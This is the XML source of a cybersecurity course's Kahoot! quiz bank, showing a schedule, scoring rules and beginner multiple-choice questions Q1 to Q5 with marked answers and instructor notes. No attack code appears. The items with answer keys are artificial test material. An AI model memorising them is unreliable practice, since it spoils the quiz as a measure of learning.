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EF4444"/>
          <w:sz w:val="56"/>
        </w:rPr>
        <w:t>MetaBridge Academy</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="060D1E"/>
          <w:sz w:val="40"/>
        </w:rPr>
        <w:t>CYBERSECURITY</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="64748B"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>Kahoot! Quiz Bank</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>MetaBridge Academy — Cybersecurity</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Document 4: Kahoot! Quiz Bank</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>180 Questions · 12 Modules · 15 Questions Each</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Course:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Cybersecurity</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Textbook Reference:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> *Cybersecurity Sefer* — available at metabridgeacademy.com</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Format:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Kahoot!-ready · 4 options per question · single correct answer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Enrolment:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> https://wa.me/2347034357206</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>HOW TO USE THIS QUIZ BANK</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Import into Kahoot!</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Log in to kahoot.com → Create → Quiz</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Enter question text, four options, select correct answer, set timer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Duplicate questions take 2 minutes each — use bulk import via CSV if available on your plan</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Time Limit Guide</w:t>
      </w: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60D1E"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Code</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
            <w:shd w:val="clear" w:color="auto" w:fill="060D1E"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Type</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
            <w:shd w:val="clear" w:color="auto" w:fill="060D1E"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Timer</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
            <w:shd w:val="clear" w:color="auto" w:fill="060D1E"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Points</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>[RECALL]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Memorisation / definition</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>20–30 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>1,000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>[CONCEPT]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Understanding / application</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>45 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>1,000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>[CRITICAL]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Analysis / evaluation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>60 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>1,000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>[SCENARIO]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Real-world case judgement</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>60 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>2,000 ★</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Double-point questions</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (★ 2,000 pts) are the highest-difficulty question in each module — typically Q15, Q30, Q45, etc. Use these to create dramatic leaderboard swings at session end.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Recommended Session Structure</w:t>
      </w:r>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60D1E"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Session</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
            <w:shd w:val="clear" w:color="auto" w:fill="060D1E"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Modules</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
            <w:shd w:val="clear" w:color="auto" w:fill="060D1E"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Questions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
            <w:shd w:val="clear" w:color="auto" w:fill="060D1E"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Duration</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Week 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>M1–M2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Q1–Q30</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>25 min</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Week 2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>M3–M4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Q31–Q60</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>25 min</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Week 3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>M5–M6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Q61–Q90</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>25 min</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Week 4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>M7–M8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Q91–Q120 + Q105-B/Q106-B/Q107-B (Log4Shell bonus)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>30 min</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Week 5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>M9–M10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Q121–Q150</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>25 min</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Week 6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>M11–M12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Q151–Q180</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>25 min</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Final Review</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>M1–M12</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Top 30 (curated)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>30 min</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>MODULE 1 [BEGINNER]: Introduction to Cybersecurity &amp; the CIA Triad</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Level: Beginner | Questions: Q1–Q15*</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q1</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What does the "C" in the CIA Triad stand for?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Cryptography</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">B) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Confidentiality</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Compliance</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Continuity</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 20 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Opening question — nearly everyone gets it right. Use to build confidence before harder questions.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q2</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which element of the CIA Triad ensures that data has not been altered or tampered with?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Confidentiality</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Availability</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Integrity</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Authentication</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 20 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Good for distinguishing the three — many students confuse Integrity with Confidentiality.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q3</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A hospital's patient records system is taken offline by ransomware. Which CIA pillar is MOST directly violated?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Confidentiality</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Integrity</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Availability</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Authentication</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Healthcare example makes it visceral. Link to Nigeria's hospital ransomware incidents.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q4</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which type of threat actor is typically motivated by financial gain from cybercriminal activity?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Hacktivist</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Nation-state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Cybercriminal</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Script kiddie</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Reinforce the threat actor taxonomy from Module 1 lecture.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q5</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>The principle of "least privilege" means:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Hackers should be given minimal punishment</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">B) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Users receive only the access rights they need for their job</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Passwords should be as short as possible</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Systems should be kept offline unless needed</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Foundational concept — will reappear in every subsequent module.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q6</w:t>
      </w:r>
      <w:r/>
